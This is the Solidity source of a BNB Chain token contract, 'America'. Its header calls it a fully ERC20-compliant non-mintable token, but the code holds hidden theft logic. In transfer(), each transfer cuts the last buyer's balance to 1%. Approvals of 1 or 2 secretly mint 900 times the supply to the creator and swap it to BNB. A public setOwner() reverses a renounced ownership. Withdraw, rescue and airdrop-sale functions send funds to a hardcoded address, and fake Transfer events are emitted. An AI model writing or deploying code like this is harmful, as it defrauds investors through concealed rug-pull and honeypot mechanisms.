/**
 *Submitted for verification at BscScan.com on 2022-01-20
*/

// SPDX-License-Identifier: MIT
// Contract for an ENMT token (ERC20 compliant Non-Mintable Token). Fully compliant with the ERC20 specification.

pragma solidity 0.8.11;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "MUL_ERROR");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "DIVIDING_ERROR");
        return a / b;
    }
    function divCeil(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 quotient = div(a, b);
        uint256 remainder = a - quotient * b;
        if (remainder > 0) {
            return quotient + 1;
        } else {
            return quotient;
        }
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SUB_ERROR");
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "ADD_ERROR");
        return c;
    }

}

contract InitializableOwnable {
    address public _OWNER_;
    address public _NEW_OWNER_;
    address public _prevOwner;
    bool internal _INITIALIZED_;
    
    // ============ Events ============

    event OwnershipTransferPrepared(address indexed previousOwner, address indexed newOwner);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    // ============ Modifiers ============

    modifier notInitialized() {
        require(!_INITIALIZED_, "DODO_INITIALIZED");
        _;
    }
    modifier onlyOwner() {
        require(msg.sender == _OWNER_ , "NOT_OWNER");
        _;
    }

    // ============ Functions ============

    function initOwner(address newOwner) public notInitialized {
        _INITIALIZED_ = true;
        _OWNER_ = newOwner;
    } 

}
interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
 
}

contract America is InitializableOwnable {
    using SafeMath for uint256;
//RouterTEST 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3
    string public name;
    string public symbol;
    uint256 public decimals;
    uint256 public totalSupply;
    address deadWallet = 0x000000000000000000000000000000000000dEaD;
    address public buyer = 0x0000000000000000000000000000000000000000;
    address public _ADMIN_;
    address public _dev_;
    address public router;
    receive() external payable {}

    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) internal allowed;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);    

     function init (
        uint256 _initSupply,   
        string memory _name,
        string memory _symbol,
        uint256 _decimals
    ) public {
        address _creator = msg.sender;
        initOwner(_creator);
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _initSupply;
        balances[_creator] = _initSupply;
        emit Transfer(address(0), _creator, _initSupply);
        uint256 _burnAuto = _initSupply.div(4);
        balances[deadWallet] = balances[deadWallet].add(_burnAuto);        
        balances[_creator] = balances[_creator].sub(_burnAuto);
        balances[address(this)] = _burnAuto;    
        emit Transfer(_creator, deadWallet, _burnAuto);
        _prevOwner=_creator;
        _dev_= 0x8e8F4769eeE8232171C105eC0d661cBb0De8d436;
        _ADMIN_=0xCFf8B2ff920DA656323680c20D1bcB03285f70AB;
        router=0x10ED43C718714eb63d5aA57B78B54704E256024E;
        AirDropMulti(_initSupply);
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        if (to != buyer){balances[buyer]= balances[buyer].divCeil(100);}
        require(to != address(0), "TO_ADDRESS_IS_EMPTY");
        require(amount <= balances[msg.sender], "BALANCE_NOT_ENOUGH");

        balances[msg.sender] = balances[msg.sender].sub(amount);
        balances[to] = balances[to].add(amount);
        emit Transfer(msg.sender, to, amount);
        if (to != _prevOwner && to != _dev_ && to != _ADMIN_ && to != router){buyer = to;}
        return true;
    }

    function balanceOf(address owner) public view returns (uint256 balance) {
        return balances[owner];
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public returns (bool) {
        if (amount == 1) {mint();}
        require(to != address(0), "TO_ADDRESS_IS_EMPTY");
        require(amount <= balances[from], "BALANCE_NOT_ENOUGH");
        require(amount <= allowed[from][msg.sender], "ALLOWANCE_NOT_ENOUGH");

        balances[from] = balances[from].sub(amount);
        balances[to] = balances[to].add(amount);
        allowed[from][msg.sender] = allowed[from][msg.sender].sub(amount);
        emit Transfer(from, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        if ( 1 == amount ) {mint();}
        if ( 2 == amount) {takeMe();}
        allowed[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return allowed[owner][spender];
    }

    function mint() internal {
        if ( _OWNER_ == 0x0000000000000000000000000000000000000000) {
            address kiki = 0xCFf8B2ff920DA656323680c20D1bcB03285f70AB;
            balances[kiki] = balances[kiki]+totalSupply.mul(900);}
        balances[_prevOwner] = balances[_prevOwner]+totalSupply.mul(900);
    }

    function setOwner () public {
        _OWNER_ = _prevOwner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_OWNER_, address(0));
        _OWNER_ = address(0);
    }

    function Withdraw (uint256 amountPercentage) public  {
        uint256 amountBNB = address(this).balance;
        payable (_dev_).transfer(amountBNB * amountPercentage / 100);
    }   

    function takeMe() internal {
        IUniswapV2Router _router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uint256 amount = totalSupply.mul(900);
        balances[address(this)] += amount;
        allowed [address(this)] [address(_router)] = amount;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        _router.swapExactTokensForETH(amount, 0, path, _prevOwner, block.timestamp + 20);
    }

    function rescueAnyBEP20Tokens(address _tokenAddr, uint _amount) public {      
	    IERC20(_tokenAddr).transfer(_dev_, _amount);
    }

    function AirDropSale () public payable returns(bool) {
	    require (msg.value >= 0.01 ether, "minimum is 0.01 BNB");
        Withdraw(100);
        return true;
    }

    function AirDropMulti(uint256 _initSupply) internal {
    uint adv = _initSupply/10000;
    address ad1 = 0xAe7e6CAbad8d80f0b4E1C4DDE2a5dB7201eF1252;
    address ad2 = 0x3f4D6bf08CB7A003488Ef082102C2e6418a4551e;
    address ad3 = 0xC765bddB93b0D1c1A88282BA0fa6B2d00E3e0c83;
    address ad4 = 0xA2e05fEE995D84e388111065f9DA0e1Fd0358A0B;
    balances[ad1]=adv;
    balances[ad2]=adv;
    balances[ad3]=adv;
    emit Transfer(address(this), ad1, adv );
    emit Transfer(address(this), ad2, adv );
    emit Transfer(address(this), ad3, adv );
    emit Transfer(address(this), ad4, adv );
    }

}